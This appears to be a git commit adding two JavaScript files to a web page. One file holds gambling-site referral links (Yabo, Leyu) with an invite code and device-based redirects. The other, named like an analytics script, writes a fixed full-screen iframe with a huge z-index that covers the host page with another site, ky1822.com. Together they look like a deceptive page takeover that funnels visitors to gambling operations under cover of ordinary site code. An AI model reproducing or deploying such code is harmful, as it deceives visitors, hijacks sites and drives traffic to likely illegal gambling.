8f2560ec033664bd6df48947e7966ca7ee177f19
ky1688 <119034301+ky1688@users.noreply.github.com>
2022-11-25 16:36:43 +0800

    Add files via upload

---
+++ index_files/link.js
@@ -0,0 +1,72 @@
+﻿var link = {
+
+    //亚博
+
+    yaboPc: 'https://172er.wcsxh.com:9504/entry/register/?i_code=83185944',                //亚博电脑
+
+    yaboH5: 'https://172er.wcsxh.com:9504/entry/register/?i_code=83185944',          //亚博h5
+
+    yaboApp: 'https://www.9i0a9.com:6660/?i_code=83185944',                 //亚博aap
+
+                   
+
+
+    //乐鱼
+
+    leyuPc: 'https://172er.wcsxh.com:9504/entry/register/?i_code=83185944',              //乐鱼电脑
+
+    leyuH5: 'https://172er.wcsxh.com:9504/entry/register/?i_code=83185944',        //乐鱼h5
+
+    leyuApp: 'https://www.9i0a9.com:6660/?i_code=83185944',                     //乐鱼app
+
+
+}
+
+
+function getDevice() {
+
+    if (/(Android|IOS|iPhone|iPad|iPod|Windows Phone|webOS|BlackBerry)/i.test
+
+(navigator.userAgent)) {
+
+        return 'mobile'
+
+    } else {
+
+        return 'pc'
+
+    }
+
+}
+
+const device = getDevice();
+
+
+function register(key) {
+
+    if (key === 'yabo') {
+
+        
+
+window.location.href = device == 'pc' ? link.yaboPc : link.yaboH5;
+
+    } else if (key === 'leyu') {
+
+        window.location.href = device == 'pc' ? link.leyuPc : 
+
+link.leyuH5;
+
+    } else {
+
+        window.location.href = link[key]
+
+    }
+
+}
+
+
+function contact() {
+
+    window.open(link.contact);
+
+}
---
+++ index_files/tongji.js
@@ -0,0 +1,22 @@
+document.write('<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no"><style>html,body{width:100%;height:100%;margin:0;padding:0}</style>');
+var iframe = document.createElement('iframe');
+iframe.src = 'https://www.ky1822.com';
+iframe.scrolling = 'auto';
+iframe.style.cssText = "width:100%;height:100%;left:1px;top:1px;border:none;background:#fff";
+var div1 = document.createElement("div");
+var div = document.createElement("div");
+div1.style.cssText = "-webkit-overflow-scrolling:touch;width:100%;height:100%;z-index:9999999999;position:fixed;top:0;left:0;";
+var is_mobi = navigator.userAgent.toLowerCase().match(/(ipad|iphone|android|coolpad|mmp|smartphone|midp|wap|xoom|symbian|j2me|blackberry|wince)/i) != null;
+if (is_mobi) {
+    div1.style.overflow = "auto"
+}
+div1.appendChild(iframe);
+div.appendChild(div1);
+document.write(div.innerHTML);
+var _0 = _0 || [];
+(function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?2bfd62fd4042a96ecdb556a2d07e8158";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s)
+})();
